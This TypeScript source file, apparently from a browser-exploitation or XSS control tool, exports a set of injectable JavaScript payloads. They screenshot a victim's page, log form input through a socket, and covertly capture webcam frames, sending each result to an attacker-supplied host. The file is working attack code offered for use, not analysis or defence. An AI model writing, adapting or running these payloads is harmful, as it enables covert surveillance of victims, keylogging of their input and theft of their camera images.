export const Payload = (URL: string): { [key: string]: string } => {
  return {
    close: "window.location.reload() || 'Connection closed'",
    screenshot: `import('https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js').then(()=>html2canvas().then(c=>c.toDataURL())).then((base64)=>fetch('https://${URL}/screenshot',{method:"POST",headers: {'Content-Type': 'application/json'},body:JSON.stringify({screenshot:base64,fileName:window.location.href})})).err||'Please wait for screenshot'`,
    keylogger:
      "document.addEventListener('change',(e)=> socket.send(JSON.stringify({type:'stream',name:'keylogger',[e.target.nodeName]:{value:e.target.value,attributes:Object.assign({},...[...new Set(e.target.attributes)].map((attr) => ({[attr.nodeName]: attr.value})))}})))||'Keylogger Executed'",
    videoStream: `(()=>{v=document.createElement('video');navigator.mediaDevices.getUserMedia({video:true}).then((stream)=>{v.srcObject=stream;v.play();setInterval(()=>{c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);fetch('https://${URL}/videoStream',{method:'POST',headers: {'Content-Type': 'application/json'},body:JSON.stringify({video:c.toDataURL(),fileName:window.location.href})})},5000)})})()||'Video Stream Started'`,
  };
};
